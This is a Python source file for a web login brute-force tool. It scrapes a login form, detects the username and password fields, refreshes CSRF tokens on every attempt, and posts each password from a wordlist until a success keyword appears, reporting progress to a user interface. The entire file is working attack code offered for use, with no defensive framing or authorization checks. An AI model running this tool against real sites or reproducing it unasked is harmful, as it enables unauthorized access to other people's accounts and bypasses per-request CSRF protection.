import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time


def get_login_form(session, login_url):
    """
    Fetch and parse the login form from a webpage using an existing session.
    Returns the form action, method, and input fields (including CSRF tokens).
    """
    try:
        response = session.get(login_url, timeout=10)
    except requests.RequestException as e:
        print(f"[!] Failed to connect to login page: {e}")
        return None, None, None

    soup = BeautifulSoup(response.text, "html.parser")
    form = soup.find("form")
    if not form:
        print("[!] No form found on page.")
        return None, None, None

    action = form.get("action", "")
    method = form.get("method", "post").lower()

    fields = {}
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        value = input_tag.get("value", "")
        if name:
            fields[name] = value

    return action, method, fields


def run_bruteforce(
    login_url,
    username,
    wordlist_path,
    update_progress,
    log_output,
    user_field_override=None,
    pass_field_override=None,
    success_keyword="dashboard",
    delay=0,
):
    session = requests.Session()

    # Initial fetch to get form fields
    action, method, form_data = get_login_form(session, login_url)
    if None in (action, method, form_data):
        return "[!] Error loading or parsing the login form."

    username_field = user_field_override or next(
        (k for k in form_data if "user" in k.lower()), None
    )
    password_field = pass_field_override or next(
        (k for k in form_data if "pass" in k.lower()), None
    )

    if not username_field or not password_field:
        return "[!] Could not identify login fields. Please provide field names."

    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            passwords = f.readlines()
    except Exception as e:
        return f"[!] Error reading wordlist: {e}"

    total = len(passwords)

    for i, password in enumerate(passwords):
        password = password.strip()

        # Refresh form and tokens on each attempt (to avoid CSRF issues)
        action, method, form_data = get_login_form(session, login_url)
        if None in (action, method, form_data):
            return "[!] Failed to reload login form."

        username_field = user_field_override or next(
            (k for k in form_data if "user" in k.lower()), None
        )
        password_field = pass_field_override or next(
            (k for k in form_data if "pass" in k.lower()), None
        )

        if not username_field or not password_field:
            return "[!] Could not detect or override login field names."

        form_data[username_field] = username
        form_data[password_field] = password

        full_action_url = urljoin(login_url, action)

        try:
            response = session.post(full_action_url, data=form_data, timeout=10)
        except requests.RequestException:
            log_output.markdown(f"❌ Attempt {i+1}/{total}: Network error")
            continue

        log_output.markdown(f"🔄 Attempt {i+1}/{total}: `{password}`")

        if success_keyword.lower() in response.text.lower():
            update_progress(100)
            return f"[+] SUCCESS: Password found: **{password}**"

        update_progress(int(((i + 1) / total) * 100))
        time.sleep(delay)

    return "[-] Password not found in wordlist."
